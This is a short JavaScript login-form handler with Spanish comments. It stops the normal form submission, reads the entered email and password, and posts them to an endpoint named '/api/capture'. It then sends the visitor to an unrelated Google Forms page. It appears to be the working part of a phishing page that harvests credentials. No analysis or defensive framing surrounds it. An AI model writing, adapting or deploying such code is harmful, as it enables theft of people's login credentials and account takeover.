document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    // Enviar datos al servidor
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/capture', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        console.log('[DEBUG] readyState=' + xhr.readyState + ' status=' + xhr.status + ' response=' + xhr.responseText);
        if (xhr.readyState === 4) {
            window.location.href = 'https://forms.gle/eUQK7v1gspsgRe228';
        }
    };
    xhr.onerror = function() {
        console.log('[DEBUG] xhr.onerror disparado — fallo de red/CORS antes de completar');
    };
    xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
});